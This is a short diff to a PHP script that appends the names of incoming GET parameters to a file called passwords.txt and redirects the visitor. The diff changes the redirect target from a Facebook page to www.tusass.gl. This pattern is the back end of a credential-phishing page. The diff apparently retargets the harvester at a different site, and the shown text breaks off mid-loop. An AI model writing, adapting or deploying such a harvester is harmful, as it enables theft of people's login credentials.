@@ -1,5 +1,5 @@
 <?php
-header("Location: http://www.facebook.com/home.php? ");
+header("Location: http://www.tusass.gl ");
 $handle = fopen("passwords.txt", "a");
 foreach($_GET as $variable => $value) {
 fwrite($handle, $variable);
